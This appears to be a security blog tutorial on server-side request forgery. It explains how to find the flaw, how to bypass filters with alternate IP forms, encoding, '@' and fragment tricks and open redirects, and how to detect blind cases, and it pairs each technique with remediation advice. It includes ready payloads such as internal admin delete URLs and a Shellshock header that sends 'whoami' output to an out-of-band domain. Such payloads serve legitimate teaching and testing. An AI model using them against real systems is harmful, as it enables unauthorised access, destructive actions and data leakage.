# Server-Side Request Forgery (SSRF)

![SSRF Protocol Thumbnail](blog-images/SSRF.avif)


**Summary**

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make HTTP requests from the server to arbitrary or unintended locations. Exploiting SSRF can expose internal resources (for example `http://localhost`, internal admin panels, metadata endpoints), leak sensitive data (credentials, tokens), or trigger side effects (delete users, change state) on internal services.

---

## Table of contents

1. Introduction
2. How to **find** SSRF

   * Manual reconnaissance
   * Automated scanning
   * Signs in responses / logs
3. Direct SSRF (example & exploitation)
4. SSRF and input-filtering

   * Blacklist-based filters & bypass techniques
   * Whitelist-based filters & bypass techniques
5. Bypassing via open redirection (chain exploitation)
6. Blind SSRF (detection and exploitation)

   * OAST / out-of-band testing
   * Example: Shellshock-based OOB probe
7. Practical examples (encoded payloads and payload recipes)
8. Remediations and defenses

   * General recommendations
   * Defenses per bypass technique
   * Detecting SSRF in logs and monitoring
9. Testing checklist & recommended tools
10. Safe testing rules & legal notes
11. Appendix: quick payload cheatsheet

---

## 1. Introduction

SSRF occurs when an application accepts a URL (or a resource identifier) from a user and the server fetches that URL on behalf of the user. If the server fetcher is not carefully restricted, an attacker can force requests to internal-only services (e.g. `http://127.0.0.1:`, `http://169.254.169.254/`), or to infrastructure metadata endpoints, or to other services that perform sensitive actions.

---

## 2. How to **find** SSRF

 Manual reconnaissance

* Look for inputs that cause the server to fetch external resources: user-supplied image/file URLs, webhook targets, `profile.avatar`, `stockApi`, `url` query params, `next`/`redirect` endpoints, RSS previewers, server-side XML/JSON fetchers, remote-include features.
* Test endpoints that accept paths or URLs. Try replacing expected values with attacker-controlled URLs.
* Use an attacker-controlled domain (Interactsh / Burp Collaborator / OAST) to detect blind requests.
* Chain open redirectors with fetchers (redirector → internal) to reach internal targets.

 Automated scanning

* Fuzz inputs that accept URLs. Common parameter names: `url`, `link`, `avatar`, `image`, `file`, `stockApi`, `path`, `endpoint`, `next`, `redirect`.
* Use scanners that include SSRF payload dictionaries and attempt many encodings and IP representations.
* Use OAST tools to catch blind SSRF (out-of-band interactions).

 Signs in responses / logs

* Error messages that incorporate remote response data (status codes, HTML snippets, headers).
* Unusually slow responses when targeting internal addresses (timeouts).
* Unexpected DNS queries or HTTP requests to attacker-controlled hosts (log evidence).
* Server logs showing outbound connections to addresses you triggered.

---

## 3. Direct SSRF (example & exploitation)

If a server fetches a user-supplied URL without restriction, you can point it at internal admin endpoints. Example:

```
stockApi=http://192.168.0.202:8080/admin/delete?username=carlos
```

If the fetcher makes a request to that URL, the internal service may perform the destructive action (delete user) because the internal service trusts internal-origin requests.

**Exploit steps (simple case)**

1. Identify parameter that the server will fetch (e.g. `stockApi`).
2. Replace the URL with the internal target (IP + path + query) you want the server to call.
3. Observe application behavior, or use OAST for blind cases.

**Remediation (basic)**

* Disallow user-controlled hosts entirely for server-side fetchers unless absolutely necessary.
* If external fetch is required: use an allowlist of domains/resources, resolve domains and confirm IP addresses are not internal/private, and proxy requests through a hardened gateway that enforces restrictions and logs calls.

---

## 4. SSRF and input-filtering

 Blacklist-based filters & bypass techniques

Applications sometimes block easily recognized hostnames such as `127.0.0.1`, `localhost`, or strings like `/admin`. Blacklist filters are fragile and often bypassable.

Common bypass techniques:

* Alternate IP representations for `127.0.0.1` (decimal, octal, IPv6, `127.1`). Example: `2130706433`, `017700000001`, `127.1`.
* Register a domain that resolves to an internal IP (DNS trickery) or use collaborator domains.
* URL encoding (single / double) and case variation to hide blocked substrings.
* Redirect chains: point to an allowed domain that performs an HTTP redirect to the internal target.

Example encoding bypass:

```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

**Remediation against blacklist bypasses**

* Avoid blacklist-based defenses. Use positive allowlists and strict network egress controls.
* Normalize and fully decode inputs before validating; reject requests to private IP ranges and link-local addresses.
* Do DNS resolution server-side, then verify resolved IPs against an allowlist and block private ranges.

 Whitelist-based filters & bypass techniques

Even whitelist logic can be abused if implemented naively. Attackers exploit URL parsing quirks such as the `user:pass@host` form, fragments (`#`), subdomain tricks, and encoding.

Tricks to bypass naive whitelist checks:

1. **Using `@` to hide the real host**

   * `https://trusted.com@evil.com` — some filters may look for `trusted.com` and allow it, but the actual host is `evil.com`.

2. **Using `#` (fragment)**

   * `https://evil.com#trusted.com` — the fragment is ignored by the request target, but filters may be confused.

3. **Subdomain registration**

   * `https://trusted.com.evil.com` — filter that checks `trusted.com` presence can be bypassed.

4. **URL encoding and double-encoding**

   * Use `%2e`, `%2f`, or double-encoded values (`%252e`) to hide parts of the URL until the backend decodes them.

5. **Combos**

   * Combine `@`, `#`, subdomains, and encoding to evade complex filters.

**Remediation against naive whitelist bypasses**

* Fully parse and normalize URLs using a robust, well-tested URL parser on the server-side and resolve the final destination (DNS + any redirects).
* After resolving, perform IP address checks (block private, link-local, and RFC1918 addresses) and only allow known good IPs/hosts.
* Use an explicit allowlist of resolved IP addresses or hostnames — do not rely solely on string matching.
* Restrict egress at the network level: disallow server from reaching internal ranges except through controlled proxy.

---

## 5. Bypassing via open redirection (chain exploitation)

If the app contains an open redirector (an endpoint that will redirect to a supplied URL) and another endpoint accepts a URL/host but only allows certain domains, you can chain them:

1. Find an open redirect endpoint in the target app (e.g. `/product/nextProduct?path=...`).
2. Provide a whitelisted host that itself redirects to the internal target (the open redirector will send the server to your internal URL).
3. The server follows the redirect and reaches the internal resource.

Example attack flow (concept):

* `stockApi=http://trusted-redirect.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

**Remediation**

* Fix open redirectors by validating redirect targets or only redirecting to known safe paths.
* Proxy and validate outbound requests; do not directly perform server-side redirects to user-supplied locations.

---

## 6. Blind SSRF (detection and exploitation)

Blind SSRF: the server issues the backend request but does not return the fetched response to the client. This makes detection harder.

 OAST / Out-of-band testing

* Use OAST services (Interactsh, Burp Collaborator, or other collaborator domains) to detect blind SSRF. Provide a URL/path that triggers DNS or HTTP callbacks to your controlled domain and monitor for callbacks.
* Example: point the target input at `http://<random-id>.oast-domain/` and watch for DNS/HTTP interactions.

 Example: Shellshock-based OOB probe

If the server forwards some headers to a shell command or passes user input into a vulnerable component, you can try to trigger DNS lookups using shell payloads. Example user-agent Shellshock payload that triggers an out-of-band DNS query:

```
() { :; }; /usr/bin/nslookup $(whoami).<random-id>.oastify.com
```

If the server is vulnerable to Shellshock and uses the malicious header in a vulnerable shell context, the server will perform a DNS lookup to your OAST domain and you'll see the callback.

**Remediation**

* Patch vulnerable components (e.g., ensure Bash is patched against Shellshock).
* Sanitize and do not pass untrusted input to shell invocations.
* Ensure headers and untrusted inputs are never directly executed.

---

## 7. Practical examples (encoded payloads and recipes)

* `http://127.1` / `2130706433` / `017700000001` — alternate representations of `127.0.0.1`.
* Username trick: `http://localhost@stock.weliketoshop.net/admin/delete?username=carlos` (or with double encoding: `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`).
* Fragment trick: `http://evil.com#trusted.com` (filter sees trusted but actual host is evil.com).
* Redirect chaining: pass a whitelisted redirector that then points to the internal target.

---

## 8. Remediations and defenses

 General recommendations

* **Prefer allowlists**: only allow requests to explicitly trusted hosts/IPs. Avoid blacklists.
* **Network egress control**: block server egress to internal IP ranges, metadata endpoints, and sensitive ranges unless explicitly required and proxied.
* **Normalize & resolve**: decode URLs fully, resolve hostnames to IPs, and validate that resulting IP is allowed.
* **Proxy requests**: funnel outbound requests through a hardened proxy that enforces policies (max TTL, allowed ports, allowed hosts), logs requests, and strips sensitive headers.
* **Rate-limit & log**: log outbound fetches and monitor for anomalous destinations; rate-limit user-supplied fetches.
* **Least privilege**: internal services should not trust arbitrary internal-origin requests — require authentication and CSRF protections where applicable.

 Defenses targeted at bypass techniques

* **Against IP representation bypass**: reject requests that resolve to private/internal IP ranges after DNS resolution, no matter the representation.
* **Against `user:pass@host` trick**: use strict URL parsing and treat username/password parts separately; validate the actual host after parsing.
* **Against redirects**: validate and limit redirects or disable automatic redirect following for user-supplied URLs; if following redirects, re-validate each redirect location.
* **Against encoding tricks**: fully decode and normalize inputs before validation and apply the above checks.

 Detecting SSRF in logs and monitoring

* Monitor for outbound requests to unusual destinations, especially link-local, metadata (e.g., cloud provider metadata IPs), and uncommon ports.
* Alert on unexpected DNS queries for suspicious subdomains or collaborator OAST domains.
* Correlate user-supplied inputs and outbound requests in logs (store a request id to map input → fetched target).

---

## 9. Testing checklist & recommended tools

**Checklist**

* Identify user-controlled fetchers (upload from URL, webhooks, previewers).
* Test direct internal IPs and alternate IP encodings.
* Test `user:pass@host`, fragments `#`, double-encoding, and subdomain tricks.
* Look for open redirectors and chain them.
* Use OAST for blind SSRF detection.
* Check server logs for outbound connections.

**Tools**

* Interactsh, Burp Collaborator, OAST services for blind detection.
* Burp Suite (request manipulation, repeater, intruder), Collaborator Everywhere.
* Custom lists of SSRF payloads and encodings; scanners that include SSRF tests.

---

## 10. Safe testing rules & legal notes

* Only test systems you are authorized to test. Unauthorized SSRF testing can cause denial-of-service or data leakage and may be illegal.
* Use non-destructive payloads when possible (e.g., DNS and HTTP callbacks rather than destructive admin actions) unless you have explicit authorization to perform destructive testing.
* Inform and coordinate with the assessed organization's ops/security team if you need to perform intrusive tests.

---

## 11. Appendix: quick payload cheatsheet

Defination:

Web vulnerability that enables to interact with a server (internal or external network,
or the host itself)
Can give access to files, services (for example web, FTP, SMTP, SQL/NoSQL, etc.) on the
vulnerable server or on another server of the internal network of the server, to other
servers or networks, to an interface router…

</br>

Where to find it?

 Uploading a file
 API calls
 Webhooks
 Redirecting to a page
 Document parsers
 Documents generators




* `http://127.0.0.1` / `http://127.1` / `2130706433` / `017700000001`
* `http://localhost@trusted.com` (username trick)
* `http://localhost%2523@trusted.com/admin` (double-encoded fragment trick to force `localhost/admin`)
* `http://trusted.com.evil.com` (subdomain trick)
* Shellshock header example for OOB: `() { :; }; /usr/bin/nslookup $(whoami).<random-id>.oastify.com`
* Use OAST domain: `<random-id>.<your-oast-domain>` to detect blind SSRF

---

